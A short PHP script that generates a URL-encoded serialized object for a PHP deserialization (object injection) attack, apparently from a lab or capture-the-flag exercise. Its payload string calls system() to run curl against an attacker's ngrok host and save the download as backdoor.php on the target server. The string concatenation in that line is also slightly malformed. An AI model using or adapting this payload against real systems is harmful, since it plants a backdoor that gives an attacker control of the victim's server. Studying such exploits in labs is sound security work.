<?php
	$NGROK_HOST = ""; // TODO: ngrok host (check README.md)
	$NGROK_PORT = 0; // TODO: ngrok port (check README.md)

	class PHPClass
	{
		public $condition = true;
		public $prop = "system('curl http://".$NGROK_HOST.":".$NGROK_PORT" -o backdoor.php');";
	}

	echo urlencode(serialize(new PHPClass));
?>
